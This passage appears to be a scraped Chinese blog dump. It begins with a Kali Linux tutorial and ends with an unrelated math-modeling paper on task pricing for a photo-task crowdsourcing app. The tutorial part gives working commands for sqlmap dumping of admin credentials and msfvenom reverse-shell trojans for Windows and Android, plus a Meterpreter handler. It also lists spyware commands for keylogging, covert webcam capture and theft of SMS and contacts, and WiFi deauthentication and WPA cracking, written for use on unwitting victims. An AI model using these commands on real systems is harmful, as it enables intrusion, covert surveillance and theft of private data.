Language，超文本置标语言）网页文件中的服务器端脚本代码。除服务器端脚本代码外，ASP文件也可以包含文本、HTML（包括相关的客户端脚本）和com组件调用。 [1-2]ASP简单、易于维护 ， 是小型页面应用程序的选择 ，在使用DCOM （Distributed Component Object Model）和 MTS（Microsoft Transaction Server）的情况下， ASP甚至可以实现中等规模的企业应用程序。 [3] 7.1.2 PHPPHP（外文名:PHP: Hypertext Preprocessor，中文名：“超文本预处理器”）是一种通用开源脚本语言。语法吸收了C语言、Java和Perl的特点，利于学习，使用广泛，主要适用于Web开发领域。PHP 独特的语法混合了C、Java、Perl以及PHP自创的语法。它可以比CGI或者Perl更快速地执行动态网页。用PHP做出的动态页面与其他的编程语言相比，PHP是将程序嵌入到HTML（标准通用标记语言下的一个应用）文档中去执行，执行效率比完全生成HTML标记的CGI要高许多；PHP还可以执行编译后代码，编译可以达到加密和优化代码运行，使代码运行更快。 7.2 ASP渗透 监测是否存在注入1sqlmap -u 网站 如果该目标网站有注入，则会返回数据库的各种信息。 拆解目标网站的数据库表 1sqlmap -u 网站 --tables 根据User表拆解列名 1sqlamp -u 网站 --columns -T \"user\" username拆解出来后就不需要再进行拆解了 得到目标网站后台管理员的登录密码1sqlmap -u 目标网站 --dump -C \"username,password\" -T \"user\" —dump：下载数据-C “username,password” 列名 7.3 PHP渗透待更新 7.4 Cookie渗透待更新 八、Metasplooit8.1 基本操作 启动：msfconsole 漏洞利用工具：exploit 漏洞执行后的demo：payloads 8.2 远程控制软件8.2.1 实现过程 根据自己的ip设定一个木马（旧版使用msfpayload 不是 msfvenom -p），本操作是在桌面路径下执行 1msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=kali的ip LPORT=55555 -f exe &gt; test.exe 之后会生成一个test.exe木马程序，将文件拖至windows平台上 使用handler模块，本操作以及之后的操作是在msfconsole下执行 1use exploit/multi/handler 用shellcode程序 1set PAYLOAD windows/meterpreter/reverse_tcp 查看 1show options 设置参数，比如设置ip和端口 12set LHOST 自己的ipset LPORT 端口（55555） 执行并等待目标上钩 1exploit 8.2.2 木马基本功能当用户点击您的鱼饵之后，您就拥有了对方的所有权限，一下是一些基本的操作： sysinfo：获取到对方设备的系统信息 shell获取受害者的终端权限，通过这个终端您就可以完全控制对方的设备 background：将该权限放到后台，通过session -l（小写字母I） 1来重新获取会话 run vnc：开启远程桌面，执行之后就可以看到对方完整的桌面了。 注入进程 得到要注入的pid进程：ls migrate XXX（pid）注入 8.2.3 文件管理功能 download 下载文件 edit 编辑文件 cat 查看文件 mkdir 创建文件夹 mv 移动文件 rm 删除文件 upload 上传文件 rmdir 删除文件夹 8.2.4 网络及系统操作网络操作： arp 看arp缓冲表 ifconfig ip地址网卡 getproxy 获取代理 netstat 查看端口链接 系统操作： kill 杀进程 ps 查看进程表 reboot 重启电脑 reg 修改注册表 shell 获取终端 shutdown 关闭电脑 sysinfo 获取系统信息 8.2.5 用户操作和其他功能 enumdesktops 窗体 keyscan_dump 键盘记录—下载 keyscan_start 键盘记录—开始 keyscan_stop 键盘记录—停止 uictl 获取键盘鼠标控制权 record_mic 声音和音频录制 webscan_chat 查看摄像头接口 webscan_list 查看摄像头列表 webscan_stream 查看摄像头获取（偷窥） getsystem 获取管理员权限 hashdump 下载hash 九、安卓渗透9.1 实现过程 9.1 在终端根据自己的ip生成安卓木马1msfvenom -p android/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=kali的ip LPORT=55555 -f apk &gt; test.APK 生成木马之后，我们将木马程序装在手机上即可。在这里呢，也就是我们平时比较常见的未知链接、不明邮件之类的鬼东西。 9.2 启动Metasplooit 1msfconsole 9.3 使用handler 1use exploit/multi/handler 9.4 设置安卓木马 1set PAYLOAD android/meterpreter/reverse_tcp 9.5 查看参数 1show options 9.6 设置参数 12set LHOST 192.168.31.147set HPORT 55555 9.7 启动监听 1exploit 9.2 常见操作 search 搜索文件（.jpg、.png、.bmp之类的文件），这个操作就有点邪恶了，大家一定要注意哦！！！ download 下载（.jpg、.png、.bmp之类的文件，还有你的所有短信、所有电话联系人…………………） webcam_stream 开启手机摄像头 webcam_snap 启动摄像头进行自动拍照（小心，这里拍照的过程中是不会有任何响应的，也就是说在这个过程中手机主人是不可能有任何察觉的） check_root 检查ROOT dump_calllog 下载电话记录 dump_contracts 下载短信记录 geolocat gps定位 十、Fluxion10.1 Fluxion下载下载fluxion源码并进入fluxion且运行：1234git clone https://github.com/FluxionNetwork/fluxion.git cd fluxion./fluxion.sh若提示没下载fluxion.sh，则按照要求下载就行 十一、密码破解 查看kali本机的密码字典 1locate wordlist 查看某个密码文件 1cat /etc/shadow 拷贝/etc/shadow密码文件 1cp /etc/shadow/ /root/Desktop/hash.list more /etc/login.defs 十二、Hydra1 十三、无线破解首先做的三步：123service network-manager stopairmon-ng check killaiarmon-ng start wlan0 开启监听：1airmon-ng statr wlan0 监听所有：1airodump-ng wlan0mon 监听指定bssid：1airodump-ng wlan0mon --bssid XXXX -c 频道 -w wpa(保存名) 将连接打掉：1aireplay-ng -0 2 -a [mac地址] -c [客户端mac地址] wlan0mon 12ifconfig wlan0mon downifconfig wlan0mon up 破解：1aircrack-ng -w [字典] /root/XXX.cap kali自带常用字典目录：12/usr/share/john/password.lst/usr/share/wfuzz/wordlist/ 查看字典文件是否含有该密码：1grep Password password.lst 查看字典有多少行：1cat [字典] | wc -l 解压文件：1gunzip rockyou.txt.gz 发现支持wps的AP123wash -i wlan0mon或者是airodump-ng wlan0mon --wps 爆破pin码：1reaver -i wlan0mon -b [ap mac] -vv -c [信道] wifite 伪造wifi：1airbase-ng -a [ap_mac] -c [信道] --essid [wifi名字] wlan0mon ```echo [ap(wifi名)] &gt;essid.txtairolib-ng essid_db —import essid essid.txtairolib-ng essid_db —statsairolib-ng essid_db —import password ./names.txtairolib-ng essid_db —batchaircrack-ng -r essid_fb /root/wpa-01.cap","path":"2018/09/28/Kali基本操作/"},{"title":"基于多维度空间分配算法实现APP任务定价","text":"摘要&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本文是针对“拍照赚钱”APP任务定价问题进行分析，并采用多维度空间任务定价模型、会员抉择概率模型、项目总收益模型、入包威胁矩阵模型等对不同情况下的任务进行合理定价。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;针对问题一：首先对使用Geoq平台对任务以及会员数据进行定位，在这些数据中发现有部分的异常数据。在对异常数据进行删除处理之后使用任务-会员空间分布模型对其进行合理分配，从而进行数据整合操作，进而使用Python中的Matplotlib工具绘制多功能图来分析任务定价的规律以及部分任务未完成的原因，最终对任务定价数据进行指数拟合。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;针对问题二：在该问题中需要制定新的任务定价方案并与原方案进行比较。在完成任务一的前提下，我们首先使用Matlab工具并结合矩阵相关知识对任务-会员进行再次空间分配，之后使用Z-Score对数据进行标准化，进而逐步构建多维度空间任务定价模型、护院抉择概率模型、项目总收益模型来制定新的方案。我们得到结论：任务完成度提高了 $12.005\\%$，项目实际收益提高了 $18.3875\\%$，总值为 $42964$。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;针对问题三：在考虑对任务进行打包的情况下，我们考虑到了会员信誉值和预定任务限额对任务定价的影响，对此构建入包威胁矩阵模型来对各项任务进行打包并将多维度空间任务定价模型进行有话啊，最终基于打包方案的优化模型制定新的方案，求解后得到结论：任务完成率再次提高了 $9.341\\%$，收益率提高了 $13.641\\%$，实际收益总值提高至 $45163$。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;针对问题四： 关键词： 拟合、Geoq、Z-Score、Python、Matlab、入包威胁。 **一、问题重述**1.1 问题引言&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;随着互联网领域的快速发展以及人们对科学技术的不断创新，最近一款称为“拍照赚钱”的服务模式正在逐渐融入到人们的生活中。“拍照赚钱”是移动互联网下的一种新型的自助式服务模式。用户通过下载APP并且注册成为APP的会员之后，就可以在APP平台上领取需要拍照的任务（比如上超市去检查某种商品的上架情况），进而赚取APP对任务所标定的酬金。而这种基于移动互联网的自助式劳务众包平台相对于传统的市场调查方式来说，不仅为企业提供各种商业检查和信息搜集渠道，而且有效地保证了调查数据真实性，缩短了调查的周期，进而可以大大节省人力、物力、财力。因此APP成为该平台运行的核心，而会员接受任务的可能性主要由任务价格决定，故APP中的任务定价是核心要素，而且对于公司的来说起到一个决定性作用。如果任务定价不合理，有的任务就会无人问津，而导致商品检查的失败。相反，若能通过以往数据来对其进行合理性的建模从而确定任务的定价则会取得不凡的结果。 1.2 题目数据及信息说明&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;建模命题组给出的附件一是一个已结束项目的任务数据，其中包含了每个任务的所在地的经纬度、任务的标价以及任务的完成情况（“1”表示完成，“0”表示未完成）；附件二则是会员的信息数据，其中包含了会员所在地的经纬度、预定任务的限额、预定任务的时间和会员所对应的信誉值，而信誉值往往是通过以往的任务完成情况所直接决定的，所以理论上说会员对应的信誉值越大，越优先开始挑选任务，其配额也就越大（任务分配时实际上是根据预订限额所占比例进行配发）；附件三是一个新的检查项目任务数据，其中只有任务所在地的经纬度数据，我们要做的是通过给出的数据来建立一个或若干个模型，进而将此模型应用在这些新项目上从而给平台公司提供一个比较优秀的决策。 1.3 提出问题 研究附件一中项目的任务定价规律，分析任务未完成的原因。 为附件一中的项目设计新的任务定价方案，并和原方案进行比较。 实际情况下，多个任务可能因为位置比较集中，导致用户会争相选择，一种考虑是将这些任务联合在一起打包发布。在这种考虑下，如何修改前面的定价模型，对最终的任务完成情况又有什么影响？ 4.对附件三中的新项目给出你的任务定价方案，并评价该方案的实施效果。 **二、问题分析**2.1 问题的总体分析及思维导图&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;APP平台中任务定价的设计问题就是通过已完成任务的数据来合理有效的预测未完成任务的执行情况，并使得最终所有任务完成的总价格尽可能大，从而实现APP平台的最大价值率。对此，首先我们需要通过附录一和附录二中的数据来确定影响任务定价的可能相关因素以及分析最终未完成任务的可能原因，以便为后期的建模提供较优的铺垫；然后，在问题二中，我们需要在完成问题一的情况下，对该项目的任务设计一个新的定价方案并建立较优的数学模型，然后可以通过此模型来比较该新的设计方案与原方案的完成情况，进而总结改进之后方案的优点；此外，在问题三中，命题组提到多个集中的任务可能会对用户的选择造成影响，所以我们需要对之前的设计方案进一步通过将这些集中任务进行联合打包发布的方式来对模型进行优化，进而分析最终任务的完成情况；最后在问题四中，我们需要对通过前三问得出的模型来对附录三中的待定任务进行估价并且评价方案的实施效果。 2.2 问题的具体分析2.2.1 问题一&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;常言有道：具体问题具体分析。对于问题一来讲，我们可以将任务定价的影响因素归于两个方面，一种是已知提供的因素，另一种则是未知潜在的因素。在未知潜在的因素中有任务本身所对应的初始价值以及公司发布任务所在时间点的经营状况等方面因素决定，然而这些因素所决定的条件及信息我们无从得知，因此在这里我们在该论文中不做分析。而在已知提供的因素中，我们主要可以从命题组给出的附录中出发。在给出的附录一和附录二中，我们可以发现其中具有分析价值的数据，对此我们将影响任务的定价初步归因于任务的地理位置、会员所在地的集中程度、任务发布时间以及任务发布地的经济状况四个因素，后期我们也是从这四个因素出发来确定四个因素与任务定价的真正关系。而任务未完成的原因主要从任务定价的合理性、任务的竞争力两个方向进行分析。 2.2.2 问题二&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;“拍照赚钱”APP的任务定价是一种任务发布者（APP平台）与任务接受者（平台会员）之间所进行的互利模式，PP平台希望在成本一定的情况下使得任务的完成率尽可能的提高，而APP会员则需要在满足某种条件要求下追求收益尽可能大。从实际出发，一份任务理论上可以分配给多个使其相互竞争，而一个会员亦可接受多份任务，这两者在初始阶段是一种“多对多”的关系。而最终的情况是一个任务只能分配给一个会员，而一个会员依然可以接受多份任务，这是一种“多对一”的关系。 2.2.3 问题三&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在本问中，提到实际情况下多个任务可能会因为位置比较集中而导致用户会争相选择，为此我们需要采用一种打包方式来对原方案进行优化。在采用任务打包方案之后之后虽然能够提高平台的任务发布效率，但是我们必须首先解决以下两个问题： 制订一个合理的方案来对任务进行打包从而进一步提高任务的完成率，即每个打包任务簇中的任务数需要确定。 任务簇中的任务数的确定由哪些因素决定 2.2.4 问题四**三、模型假设** 公司的在一定时间段内的经济状况保持水平。 附件中任务的实际定价在进行任务-会员分配时保持不变。 会员在完成任务过程中，不考虑有特殊情况从而导致会员终止任务的进行。 会员的信誉值和预定任务的限额近似满足二维高斯分布。 **四、符号说明** 符号 说明 $D_{ik}$ 任务 $i$ 与会员 $k$ 的距离，单位千米(km) $R$ 地球的半径，单位千米(km) $P_i$ 任务 $i$ 的定价 $E^{(\\delta)}$ 某一城市的GDP所对应的经济系数 $C_i$ 会员的信誉值 $\\rho_i$ 任务 $i$ 领域内的会员密度 $Q_i$ 任务 $i$ 领域内会员的竞争度 $M_k$ 会员 $k$ 预定任务的限额 $\\theta_i$ 任务 $i$ 的经度值 $\\varphi_i$ 任务 $i$ 的纬度值 $\\theta_k$ 会员 $k$ 的经度值 $\\varphi_k$ 会员 $k$ 的纬度值 说明：表中未提到的符号会在正文中作出解释。 **五、模型的建立与求解**5.1 任务定价规律及未完成分析——问题一5.1.1 任务定价规律分析5.1.1.1 数据的整体定位&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先我们需要对所有数据中的经纬度信息来进行定位，以便于我们后续的相关分析。在这里，我们选择使用智能GeoQ平台来对附录一和附录二中的数据进行定位以便我们后续的分析，一下是定位之后得到的结果图示： 图二：附件一定位蓝黑版&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;图三：附件二定位蓝黑板 图四：附件一定位彩色版&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;图五：附件二定位彩色版 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从定位之后的图示来看，我们可以不难发现以下两个结论：1.该数据主要收集于广东省的佛山市、广州市、东莞市、深圳市四个城市，后续我们也是针对这四个地区进行分析。2.这些数据中含有特殊值，这里我们将其视为异常值，需要进行特别处理。 5.1.1.2 数据的预处理&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从我们所总结的因素出发，由于四个因素所在不同的附录之中，所以我们需要将这两个附录文件进行整合。首先通过附录一中的经纬度数据来确定任务的发布位置，然后由Python中的pandas和numpy两个工具包来对两个附录中的数据进行整合，进而完成该数据的预处理模块。 5.1.1.2.1 附件一数据的预处理&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在附件一中，其内含有任务的相关经纬度数据，由于我们在分析任务定价的过程中，将任务发布的地理位置作为主要因素之一，故我们需要确定发布任务的位置与任务所在城市中心之间的距离，以此来具体确认任务定价与任务地理位置的关系。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们要想计算出任务点与中心位置的距离，则首先需要知道中心位置的经纬度。而由上述的数据定位可知，所有数据整体在佛山、广州、深圳、东莞四个城市中，据资料显示，这是个城市中心的经纬度如下所示： 城市 经度 纬度 广州 113.27 23.13 佛山 113.12 23.02 深圳 114.05 22.55 东莞 113.75 23.05 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;既然现在已知城市中心以及所有任务点的经纬度信息，我们即可通过以下式子计算出所有任务点与中心之间的距离： D_{ij} = R*arccos[sin{\\varphi_i}sin{\\varphi_j}+cos{\\varphi _i}cos{\\varphi_j}cos(\\theta_i-\\theta_j)] 符号 说明 $D_{ij}$ 任务 $i$ 与城市中心 $j$ 的距离，单位千米(km) $R$ 地球的半径，单位千米(km) $\\theta_i$ 任务 $i$ 的经度值 $\\varphi_i$ 任务 $i$ 的纬度值 $\\theta_j$ 城市 $j$ 的经度值 $\\varphi_j$ 城市 $j$ 的纬度值 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;为此，我们就能由以下相关程序处理附件一中的数据： 12345678910def append_length(file_path, jing_value2, wei_value2, file_name, encoding): df1 = pd.read_csv(file_path, encoding=encoding) length = [] for index1, each_data1 in df1.iterrows(): jing_value1 = each_data1[\"任务gps经度\"] wei_value1 = each_data1[\"任务gps 纬度\"] distance = int(6371 * np.arccos(np.sin(wei_value1)*np.sin(wei_value2)+np.cos(wei_value1)*np.cos(wei_value2)*np.cos(jing_value1-jing_value2))) length.append(distance) df1[\"与中心距离\"] = length df1.to_csv(file_name, index=False) 5.1.1.2.2 附件二数据的预处理&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在附录二中的会员数据里，我们发现其中的经纬度数据信息在同一字段中，为了分析的方便，我们首先使用pandas将该添加对应的经度和纬度两个字段，相关核心代码如下，完整代码可见附录： 123456789def deal_column(data_path, sheet): data = pd.ExcelFile(data_path) df = data.parse(sheet) locations = df[\"会员位置(GPS)\"] location_jing = [location.split(\" \")[1] for location in locations] location_wei = [location.split(\" \")[0] for location in locations] df[\"会员gps经度\"] = location_jing df[\"会员gps纬度\"] = location_wei df.to_csv(d + \"/after_deal.csv\", index=False) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;处理之后的部分数据如下图所示： ![部分会员数据图](https://gss0.baidu.com/-Po3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/d50735fae6cd7b89fde87a4b032442a7d8330e75.jpg) 图一：会员数据处理后的部分数据 5.1.1.2.3 数据异常值的处理&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在上述操作中，我们发现附录一和附录二中含有异常值，我们需要针对进行异常值进行特殊处理，否则将会对我们后面的模型造成影响。要想具体确认每个经纬度所对应的具体位置，我们需要借助于GPSspg的相关操作。为此，我们首先将附件一和附件二中的各个位置的经纬度提取出来然后进行具体定位，最后导入到新的文件中,具体定位后的部分数据如下图所示： 图六：具体定位部分数据 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过文件中的数据可以发现，除了上述分析的佛山市、深圳市、广州市、东莞市之外还掺杂了其他地区的数据，例如清远市、中山市、别行政、惠州市等。经统计发现总共含有20个异常数据，它们的编号分别是A0297、A0751、B0005、B0006、B0007、B0022、B0033、B0039、B0048、B0082、B0135、B0136、B0472、B1077、B1585、B1627、B1708、B1727、B1820、B1822。它们的编号和具体数据内容可如图五、图六所示： 图七：附件一中的异常数据&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;图八：附件二中的异常数据 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;为了不影响后面模型的精度，这里我们将这些异常数据进行直接进行删除即可，删除的部分核心代码如下所示： 123456789101112def delete_data(data_path, sheet): df = pd.read_csv(data_path) groups = df.groupby(\"城市\") error_group = pd.DataFrame(columns=[\"会员编号\",\"会员位置(GPS)\",\"预订任务限额\",\"预订任务开始时间\",\"信誉值\",\"会员gps经度\",\"会员gps纬度\",\"详细地址\",\"城市\"]) true_group = pd.DataFrame(columns=[\"会员编号\",\"会员位置(GPS)\",\"预订任务限额\",\"预订任务开始时间\",\"信誉值\",\"会员gps经度\",\"会员gps纬度\",\"详细地址\",\"城市\"]) for city, group in groups: if city not in [\"佛山市\"、\"广州市\"、\"深圳市\"、\"东莞市\"]: error_group = pd.concat([error_group, group]) else: true_group = pd.concat([true_group, group]) error_group.to_csv(\"error_data.csv\", index=False) true_group.to_csv(\"true_data.csv\", index=False) 5.1.1.2.4 数据的整合&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由之前对任务定价的分析可知，我们需要将会员数据与任务数据进行整合，从而进一步分析公司在对任务定价的时候是否考虑到会员的相关因素。在此，我们将两个附件的数据进行整合操作的依据是在一定区域范围之内所含有的会员数目，并以此求相关会员信息的均值来对定价进行分析。我们可以通过以下公式进行计算： D_{ik} = R*arccos[sin{\\varphi_i}*sin{\\varphi_k}+cos{\\varphi_ i}cos{\\varphi_k}cos(\\theta_i-\\theta_k)] 符号 说明 $D_{ij}$ 任务 $i$ 与会员 $k$ 的距离，单位千米(km) $R$ 地球的半径，单位千米(km) $\\theta_i$ 任务 $i$ 的经度值 $\\varphi_i$ 任务 $i$ 的纬度值 $\\theta_k$ 会员 $k$ 的经度值 $\\varphi_k$ 会员 $k$ 的纬度值 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过上述距离公式，我们可以借助numpy工具计算每个任务在与会员之间的距离是否在我们规定的范围之内，从而将附件二中的有效数据合并到附件一中，即在附件一中添加四个字段：会员预定任务的限额、会员所在地的集中程度、任务发布时间以及任务发布地的经济状况。其中前三个因素可以在附录一中进行算法提取，而为了分析问题的全面性，这里多考虑到了任务发布地区的经济状况因素，虽然在本题中并未给出该方面的数据，但是我们可以通过查找相关资料进行了解从而进行综合性分析。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过上述的分析，我们在这规定若任务与会员之间的距离小于 $r$ ，则我们将该会员的数据录入到对应的任务中，即: r>D_{ik} = R*arccos[sin{\\varphi_i}*sin{\\varphi_k}+cos{\\varphi_ i}cos{\\varphi_k}cos(\\theta_i-\\theta_k)]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;结合实际情况与各个数据的经纬度的联系，我们在对数据进行整合的时候取 $r=500km$ 。由于该部分的核心代码较长，出于对论文可读性的考虑，此部分的代码不在此处进行展示，读者可在附录中进行浏览。整合之后的部分相关数据如下： 5.1.1.3 定价规律可视化及分析5.1.1.3.1 任务的地点位置对定价的影响分析&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;为了分析出任务点位置对任务定价的具体影响，我们需要将上述预处理之后的附件一中的数据进行可视化从而得到任务位置对任务定价的影响。为此我们将任务 $i$ 定为 $P_i$ ，将任务点与城市中心的距离定为 $D_{ij}$，通过这两个数据便可绘制两者之间的关系图。此处，我们不妨使用散点图将每个数据点在直角坐标系中表示出来，从而分析任务定价随着任务位置之间的大致趋势，进而选择恰当的函数来对数据点进行拟合。除此之外，为了避免城市的不同而对任务价格的影响，我们分别绘制广州、佛山、深圳、东莞的定价位置散点图。基于这种分析，我们使用matplotlib工具绘制出的散点图以及程序的核心代码如下： 12345678910def draw_scatter(file_path, color, marker, city, image_path): df = pd.read_csv(file_path) p = df[\"任务标价\"] d = df[\"与中心距离\"] plt.scatter(d/100, p, s=10, c=color, alpha=0.6, marker=marker) plt.title(\"&#123;&#125;任务位置与定价的关系\".format(city), fontproperties=font) plt.xlabel(\"Distance/x100km\") plt.ylabel(\"Price\") plt.savefig(image_path) plt.show() &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从上面的任务定价与任务位置之间的散点图中不难发现，深圳、广州、东莞、佛山整体呈现一种 “上疏下密，右疏左密”的形式。故于此，我们可以得到以下结论：距市中心越进的任务，APP平台对其任务定价相对比较低,定价在65~75之间；而距市中心越远的任务，APP平台对其任务定价相对较高，定价在76~86之间。此外，随着距离的增大，定价的价格增长的幅度整体在逐渐增大。对此，我们将这两种模型近似拟合为一个指数回归模型。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;所以，根据上面所述，我们不妨建立一个关于任务点位置对任务定价的影响的模型，为了模型进行的精确性以及拟合效果的良好度，这里我们利用WPSExcel中的散点指数拟合模型进行拟合，且该模型满足以下关系式： P_i=66.892*e^{3^{-5D_{ij}}}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;至此，我们已经求解出任务位置与定价的数学模型，而为了确认该模型的拟合程度，我们需要引入拟合优度值 $r^2$ 来进一步验证该模型。 r^2=1-\\frac{\\sum_{i=0}^m(P_i-P_c)}{\\sum_{i=0}^m(P_i-\\overline P)}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过科学计算可得知拟合优度 $r^2$=0.7317295，该值近似为1可知，该模型的拟合具有比较好的效果。于此，我们可以确认任务的位置与任务的定价存在较大的关系，即距市中心越进的任务，APP平台对其任务定价相对比较低,定价在65~75之间；而距市中心越远的任务，APP平台对其任务定价相对较高，定价在76~86之间。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过结合现实来讲，存在这种定价规律主要存在以下原因： 在距城市中心较近处，具有较大的人口密度且较为发达，完成任务的可能性较大，所以公司为了提高任务的完成率需要增大会员对任务的渴求欲，任务的价格普遍较低。 在距城市中心较远处，地理位置比较偏僻且周围环境相对比较恶劣，完成任务的可能性比较小，所以公司进行提高任务定价的方式来诱导会员完成任务。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;随后，通过我们上面所描述，任务点的经纬度与城市中心满足以下关系： D_{ij} = R*arccos[sin_{\\varphi i}sin_{\\varphi j}+cos_{\\varphi i}cos_{\\varphi j}cos(\\theta_i-\\theta_j)]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;所以，最终我们将任务的定价与任务的经纬度的关系模型定义如下： P_i=66.892*e^{3^{-5R*arccos[sin_{\\varphi i}sin_{\\varphi j}+cos_{\\varphi i}cos_{\\varphi j}cos(\\theta_i-\\theta_j)]}}5.1.1.3.2 任务发布地的经济状况&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;除了任务距城市中心的距离对任务的定价造成影响之外，城市的经济状况也会对其产生一定的影响。而为分析此种影响，我们需要对以上所述的四个城市的经济状况有所了解。据资料显示，四个城市的GDP以及变化率如下所示： 城市 GDP 变化情况 深圳 19492.60亿 增长：9.38% 广州 19610.94亿 增长：8.34% 佛山 8003.92亿 增长：7.16% 东莞 6275.06亿 增长：6.69% &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;之后，我们通过matplotlib来绘制四个城市的任务平均价格关系图，相关程序及图示结果如下所示： 123456789101112131415161718def get_mean_price(file_path): df = pd.read_csv(file_path) p = df[\"任务标价\"] mean_price = np.mean(p) return mean_priceif __name__ == \"__main__\": files = [parent_path + \"/newdata/cleaneddata/final_data1_sz.csv\", parent_path + \"/newdata/cleaneddata/final_data1_gz.csv\", parent_path + \"/newdata/cleaneddata/final_data1_fs.csv\", parent_path + \"/newdata/cleaneddata/final_data1_dg.csv\"] price_ls = [get_mean_price(each_file) for each_file in files] plt.barh(np.arange(4), price_ls, height=0.7, color=\"lightskyblue\") plt.xlabel(\"Price\") plt.ylabel(\"Cities\") plt.title(\"城市与任务定价的关系\", fontproperties=font) plt.yticks(np.arange(4), [\"深圳\", \"广州\", \"佛山\", \"东莞\"], rotation=45, size=8) for x, value in enumerate(price_ls): plt.text(y=x, x=value, s=\"&#123;&#125;\".format(value), ha=\"center\", ) plt.savefig(parent_path + \"/images/city_price.jpg\") plt.show() &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从图中我们可以了解到，东莞与佛山的任务定价相对较高，而广州和深圳的任务定价相对较低。这与上述各个城市的经济状况正好呈现一种相反的趋势，这种趋势理解为城市的经济状况与任务定价成负相关。 5.1.1.3.3 会员所在地的集中程度&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从实际出发，公司在给任务进行定价的时候，一般会考虑到一定区域内会员的分布密度，且在分布密度较小的区域内公司会提高任务的定价，以此来吸引更多的会员，从而提高APP平台访问的用户量，进而使公司的利益最大化。为此，我们同样需要由整合之后的数据来分析会员集中度对任务定价的影响，最终实现的效果图如下所示： 回溯胡 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由上图我们可以看出，结果与我们料想的如出一辙。会员的集中度与任务的定价整体存在某种负相关关系。 #### **5.1.2 任务未完成原因分析** ##### **5.1.2.1 任务未完成数据处理** &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在进行分析任务未完成原因分析时，首先我们需要对任务未完成的数据进行处理，该处理部分我们主要通过任务未完成任务数据的提取来进行。相关处理核心代码如下： 1234567def split_yes_no(file_name1, file_name2): df = pd.read_csv(data_path6, encoding=\"gbk\") for status, group in df.groupby(\"任务执行情况\"): if status == 0: group.to_csv(file_name1, index=False) else: group.to_csv(file_name2, index=False) 